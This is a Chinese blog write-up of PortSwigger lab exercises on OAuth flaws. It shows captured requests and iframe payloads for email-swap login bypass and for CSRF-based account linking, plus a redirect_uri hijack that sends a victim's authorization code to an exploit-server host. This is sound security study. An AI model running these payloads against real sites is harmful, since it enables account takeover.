@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="Oauth漏洞靶场" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            Oauth漏洞靶场
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%BB%95%E8%BF%87implicit%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9A%84oauth%E8%AE%A4%E8%AF%81"><span class="post-toc-text">绕过implicit授权访问的oauth认证</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%BC%BA%E5%88%B6OAuth%E6%A1%A3%E6%A1%88%E7%BB%91%E5%AE%9A"><span class="post-toc-text">强制OAuth档案绑定</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%80%9A%E8%BF%87redirect-uri%E5%8F%82%E6%95%B0%E5%8A%AB%E6%8C%81oauth"><span class="post-toc-text">通过redirect_uri参数劫持oauth</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%80%9A%E8%BF%87%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E7%AA%83%E5%8F%96-OAuth-%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C"><span class="post-toc-text">通过开放重定向窃取 OAuth 访问令牌</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E9%A1%B5%E9%9D%A2%E7%AA%83%E5%8F%96-OAuth-%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C"><span class="post-toc-text">通过代理页面窃取 OAuth 访问令牌</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%80%9A%E8%BF%87-OpenID-%E5%8A%A8%E6%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B3%A8%E5%86%8C%E7%9A%84-SSRF"><span class="post-toc-text">通过 OpenID 动态客户端注册的 SSRF</span></a></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="绕过implicit授权访问的oauth认证"><a href="#绕过implicit授权访问的oauth认证" class="headerlink" title="绕过implicit授权访问的oauth认证"></a>绕过implicit授权访问的oauth认证</h2><p>这里先使用题目给的凭据来使用社交媒体登录wiener:peter</p>
+<p>然后查看他的数据包</p>
+<p>首先是授权流程的开始</p>
+<p>他是发送了一个这样的数据包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /auth?client_id=hdf8jwfbn3e09sre0rvc9&amp;redirect_uri=https://0a8a00ab03d084c98032f466002c0044.web-security-academy.net/oauth-callback&amp;response_type=token&amp;nonce=33183216&amp;scope=openid%20profile%20email HTTP/2</span><br><span class="line">Host: oauth-0a5b003503508450803af2710289009f.oauth-server.net</span><br></pre></td></tr></table></figure>
+
+<p>我们可以知道，这里是使用了implicit的授权方式，且要获取的是用户的email信息</p>
+<p>发送的目标是oauth服务器</p>
+<p>他的响应包如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redirecting to &lt;a href=<span class="string">&quot;https://0a8a00ab03d084c98032f466002c0044.web-security-academy.net/oauth-callback#access_token=ar1giFlqIQECDfR3yaL8uCUM0gkye460IyILeFM2yz0&amp;amp;expires_in=3600&amp;amp;token_type=Bearer&amp;amp;scope=openid%20profile%20email&quot;</span>&gt;https://0a8a00ab03d084c98032f466002c0044.web-security-academy.net/oauth-callback<span class="comment">#access_token=ar1giFlqIQECDfR3yaL8uCUM0gkye460IyILeFM2yz0&amp;amp;expires_in=3600&amp;amp;token_type=Bearer&amp;amp;scope=openid%20profile%20email&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，响应包里带着<code>access_token</code>，这个就是隐式授权方式的一个特点，然后他会带着这个access_token去访问<code>/oauth-callback</code>。因为这个access_token不会直接发送给客户端应用程序，所以这个路由就是用来获取、保存access_token的</p>
+<p>这个路由在客户端服务器上</p>
+<p>他的代码如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">const</span> urlSearchParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>));</span><br><span class="line"><span class="keyword">const</span> token = urlSearchParams.<span class="title function_">get</span>(<span class="string">&#x27;access_token&#x27;</span>);</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://oauth-0a5b003503508450803af2710289009f.oauth-server.net/me&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer &#x27;</span> + token,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">j</span> =&gt;</span> </span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/authenticate&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">            <span class="attr">email</span>: j.<span class="property">email</span>,</span><br><span class="line">            <span class="attr">username</span>: j.<span class="property">sub</span>,</span><br><span class="line">            <span class="attr">token</span>: token</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看出来，他是使用这个token去访问oauth服务器，来获得该用户的信息</p>
+<p>然后再带着他用户里的信息，email和用户名以及token来在客户端应用程序里登录</p>
+<p>然后抓取<code>/authenticate</code>的数据包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /authenticate HTTP/2</span><br><span class="line">Host: 0ab30077035b1c5d8139acbc000200b6.web-security-academy.net</span><br><span class="line">Cookie: session=OeKSZzHYzCGoUB6SoGesuQ527cz6F42W</span><br><span class="line">Content-Length: 103</span><br><span class="line">Sec-Ch-Ua: <span class="string">&quot;Not.A/Brand&quot;</span>;v=<span class="string">&quot;8&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;114&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;114&quot;</span></span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: <span class="string">&quot;Windows&quot;</span></span><br><span class="line">Origin: https://0ab30077035b1c5d8139acbc000200b6.web-security-academy.net</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://0ab30077035b1c5d8139acbc000200b6.web-security-academy.net/oauth-callback</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;wiener@hotdog.com&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;wiener&quot;</span>,<span class="string">&quot;token&quot;</span>:<span class="string">&quot;Hz9-qlv01xSms1FW3vSUtgYKSsXcDyKmRd2d34qsHqE&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里将email替换为<a href="mailto:&#x63;&#x61;&#114;&#x6c;&#x6f;&#x73;&#x40;&#99;&#97;&#114;&#108;&#111;&#x73;&#45;&#x6d;&#x6f;&#x6e;&#x74;&#x6f;&#x79;&#97;&#x2e;&#x6e;&#101;&#x74;">&#x63;&#x61;&#114;&#x6c;&#x6f;&#x73;&#x40;&#99;&#97;&#114;&#108;&#111;&#x73;&#45;&#x6d;&#x6f;&#x6e;&#x74;&#x6f;&#x79;&#97;&#x2e;&#x6e;&#101;&#x74;</a>，然后使用request in browser 即可登录carlos的账户</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306232244352.png" title="image-20230623224447283" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306232244352.png" alt="image-20230623224447283"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306230015125.png" title="image-20230623001528055" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306230015125.png" alt="image-20230623001528055"></a></p>
+<p>这里的应该是客户端以email为凭据来进行登录，且没有把email和token进行匹配导致的绕过</p>
+<h2 id="强制OAuth档案绑定"><a href="#强制OAuth档案绑定" class="headerlink" title="强制OAuth档案绑定"></a>强制OAuth档案绑定</h2><p>这里是利用在进行授权流程的时候，没有使用<code>state</code>参数导致的csrf攻击</p>
+<p>这个网站可以使用社交媒体账户登录，也可以使用当前网站的账户进行登录</p>
+<p>其中有一个功能，就是可以使用当前网站的账户去绑定社交媒体的账户</p>
+<p>攻击流程如下</p>
+<p>先使用wiener:peter登录网站</p>
+<p>然后再点击绑定社交媒体账户</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240006941.png" title="image-20230624000649826" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240006941.png" alt="image-20230624000649826"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240007814.png" title="image-20230624000712699" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240007814.png" alt="image-20230624000712699"></a></p>
+<p>使用社交媒体账户进行登录后</p>
+<p>他会先向oauth服务器请求认证，然后再去进行绑定账户的连接</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240012026.png" title="image-20230624001223936" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240012026.png" alt="image-20230624001223936"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240012389.png" title="image-20230624001236303" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240012389.png" alt="image-20230624001236303"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240012968.png" title="image-20230624001256873" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240012968.png" alt="image-20230624001256873"></a></p>
+<p>在客户端获取到访问社交媒体账户的权限后，之后再次请求社交媒体账户的数据就不会再进行验证了</p>
+<p>然后再次点击绑定社交账户</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240014478.png" title="image-20230624001434362" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240014478.png" alt="image-20230624001434362"></a></p>
+<p>查看绑定社交媒体账户流程的开始数据包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /auth?client_id=bi0snm6fs6ss82djl1uq4&amp;redirect_uri=https://0aaf005a047f118282e2dd15002b0030.web-security-academy.net/oauth-linking&amp;response_type=code&amp;scope=openid%20profile%20email HTTP/2</span><br><span class="line">Host: oauth-0a53003f04be113282cedb3302dc001d.oauth-server.net</span><br></pre></td></tr></table></figure>
+
+<p>他的返回包如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 302 Found</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache, no-store</span><br><span class="line">Location: https://0aaf005a047f118282e2dd15002b0030.web-security-academy.net/oauth-linking?code=tKN4WxbWc2dlCWSRYkEadd51oHaL7CvvFntxhNfK6CA</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Set-Cookie: _session=G2BMcg3jGjErU274RlLql; path=/; expires=Fri, 07 Jul 2023 16:03:07 GMT; samesite=none; secure; httponly</span><br><span class="line">Set-Cookie: _session.legacy=G2BMcg3jGjErU274RlLql; path=/; expires=Fri, 07 Jul 2023 16:03:07 GMT; secure; httponly</span><br><span class="line">Date: Fri, 23 Jun 2023 16:03:07 GMT</span><br><span class="line">Keep-Alive: <span class="built_in">timeout</span>=5</span><br><span class="line">Content-Length: 287</span><br><span class="line"></span><br><span class="line">Redirecting to &lt;a href=<span class="string">&quot;https://0aaf005a047f118282e2dd15002b0030.web-security-academy.net/oauth-linking?code=tKN4WxbWc2dlCWSRYkEadd51oHaL7CvvFntxhNfK6CA&quot;</span>&gt;https://0aaf005a047f118282e2dd15002b0030.web-security-academy.net/oauth-linking?code=tKN4WxbWc2dlCWSRYkEadd51oHaL7CvvFntxhNfK6CA&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这里没有<code>state</code>参数。而state参数是用来绑定当前会话的，用来防止csrf攻击</p>
+<p>他</p>
+<p>没有这个state参数，我们就可以让任何用户访问返回包中的url，这个url是用来将网站的账户和社交媒体账户进行绑定</p>
+<p>这个code参数就代表着oauth服务器返回的授权码，在网站接受到这个授权码后，就会进行服务器到服务器的通信来获取数据，从而进行绑定，后面的步骤都是无法在浏览器上捕捉到的</p>
+<p>因为这里的code参数代表着我们自己的社交媒体的账户，所以如果被害人点击了这个url，就会将他的网站账户和我的社交媒体账户进行绑定。我们就可以使用社交媒体账户登录网站，从而接管他的账户</p>
+<p>我们再次访问绑定社交媒体的功能，然后将截取返回包，并将包drop掉，防止这个code失效导致无法绑定受害者账户</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240029053.png" title="image-20230624002946965" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240029053.png" alt="image-20230624002946965"></a></p>
+<p>将这个url复制下了，放进一个<code>&lt;iframe&gt;</code>标签里</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://0aa400dc03ff5cc8836988cc003c00ae.web-security-academy.net/oauth-linking?code=ajjPJ4LppWsueV8KzX6cyvhISss2TdVOA9Zisgsmt56&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后发送给受害者，靶场里使用他提供的exploit-server</p>
+<p>受害者访问这个url后，我们再使用社交媒体账户登录，就会绑定到他的账户</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240032642.png" title="image-20230624003215524" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306240032642.png" alt="image-20230624003215524"></a></p>
+<p><del>这里有点不解，在他这里的访问里，state的值有无都没有什么意义吧，因为我们是可以抓取到他的返回包的</del></p>
+<p><del>只要我们进行csrf攻击中带有获取到的返回包里的state，那不是一样可以进行攻击</del></p>
+<p><del>这里挖个坑，以后再埋吧</del></p>
+<p>重新了解了一下这个流程，如果要防护这种攻击，就需要在client将用户跳转到请求oauth认证服务器的时候，在url里添加上一个state参数。这个参数是不可预测的，而且state是和当前用户的session进行绑定的</p>
+<p>所以只要验证url里的state和当前用户的state是否一致，就可以防御这类攻击</p>
+<h2 id="通过redirect-uri参数劫持oauth"><a href="#通过redirect-uri参数劫持oauth" class="headerlink" title="通过redirect_uri参数劫持oauth"></a>通过redirect_uri参数劫持oauth</h2><p>这里漏洞的产生原因</p>
+<ol>
+<li>oauth认证服务没有校验<code>redirect_uri</code>参数导致<code>redirect_uri</code>参数可控，将授权码发送给攻击者。</li>
+<li>没有使用state参数，导致csrf</li>
+<li>受害者已经使用媒体账户登录过</li>
+</ol>
+<p>这个网站只能使用社交媒体登录，就是必须要通过oauth认证</p>
+<p>先按流程登录一次，获取他的数据包</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306242107163.png" title="image-20230624210712024" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306242107163.png" alt="image-20230624210712024"></a></p>
+<p>数据包如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /auth?client_id=blxbq67fa6mwqk4rhxdal&amp;redirect_uri=https://0a67009d049eca9082981fc100d40051.web-security-academy.net/oauth-callback&amp;response_type=code&amp;scope=openid%20profile%20email HTTP/1.1</span><br><span class="line">Host: oauth-0ae5004c04aeca9b82ad1d2f02410007.oauth-server.net</span><br><span class="line">Cookie: _session=zb5NW6BC3dpsCsJozbpzX; _session.legacy=zb5NW6BC3dpsCsJozbpzX</span><br><span class="line">Sec-Ch-Ua: <span class="string">&quot;Not.A/Brand&quot;</span>;v=<span class="string">&quot;8&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;114&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;114&quot;</span></span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: <span class="string">&quot;Windows&quot;</span></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://0a67009d049eca9082981fc100d40051.web-security-academy.net/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>创建一个<code>&lt;iframe&gt;</code>标签，将redirect_uri设置为攻击者控制的站点，然后发送给受害者</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://oauth-0ae5004c04aeca9b82ad1d2f02410007.oauth-server.net/auth?client_id=blxbq67fa6mwqk4rhxdal&amp;redirect_uri=https://exploit-0a8e003a0408ca4b82871e77019a00be.exploit-server.net&amp;response_type=code&amp;scope=openid%20profile%20email&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>受害者点击后，就可以在日志处接受到code的值</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306242116498.png" title="image-20230624211617465" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306242116498.png" alt="image-20230624211617465"></a></p>
+<p>然后我们退出当前登录用户，然后再次登录，在将code传给client的数据包中，将code修改为受害者的code</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306242118164.png" title="image-20230624211808112" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306242118164.png" alt="image-20230624211808112"></a></p>
+<p>然后放包，成功登录受害者账户</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306242120134.png" title="image-20230624212005058" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306242120134.png" alt="image-20230624212005058"></a></p>
